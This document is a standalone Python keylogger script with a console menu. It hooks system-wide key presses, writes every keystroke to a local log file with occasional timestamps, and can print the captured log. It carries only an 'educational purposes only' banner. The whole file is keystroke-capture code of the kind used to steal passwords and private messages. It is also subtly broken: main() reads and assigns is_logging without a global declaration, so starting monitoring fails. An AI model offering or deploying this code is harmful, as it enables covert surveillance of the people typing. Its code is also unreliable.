import keyboard
import time
from datetime import datetime
import sys
from termcolor import colored

log_file = "keystrokes.log"
max_log_size = 10000
is_logging = False

def on_key_press(event):
    global is_logging
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(log_file, "a+") as f:
            if event.name == "space":
                f.write(" ")
            elif event.name == "enter":
                f.write("\n")
            elif event.name == "backspace":
                f.write(" [BACKSPACE] ")
            elif len(event.name) > 1:
                f.write(f" [{event.name.upper()}] ")
            else:
                f.write(event.name)
            if f.tell() % 10 == 0:
                f.write(f" [{timestamp}] ")
    except Exception as e:
        print(f"Error: {e}")
        is_logging = False

def main():
    print(colored("\n⚠️ WARNING ⚠️", "red"))
    print("For educational purposes only")
    
    print("Options:")
    print("1. Start monitoring")
    print("2. View logs")
    print("3. Exit")
    
    while True:
        choice = input("\nChoose option (1-3): ")
        
        if choice == "1":
            if is_logging:
                print("Already running")
                continue
                
            print("\n" + "="*50)
            print(colored("Starting...", "blue"))
            print("Press ESC to stop")
            print("="*50 + "\n")
            
            is_logging = True
            keyboard.on_press(on_key_press)
            keyboard.wait('esc')
            is_logging = False
            keyboard.unhook_all()
            
            print("\n" + "="*50)
            print(colored("Stopped", "green"))
            print(f"Data saved to {log_file}")
            print("="*50)
            
        elif choice == "2":
            try:
                with open(log_file, "r") as f:
                    print("\n" + "="*50)
                    print(colored("LOG CONTENTS", "yellow"))
                    print("="*50)
                    print(f.read())
                    print("="*50)
            except:
                print(colored("No logs found", "red"))
                
        elif choice == "3":
            print("\n" + "="*50)
            print(colored("Exiting...", "magenta"))
            print("="*50)
            sys.exit()
            
        else:
            print(colored("Invalid choice", "red"))

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\nInterrupted", "red"))
    except Exception as e:
        print(colored(f"\nError: {e}", "red"))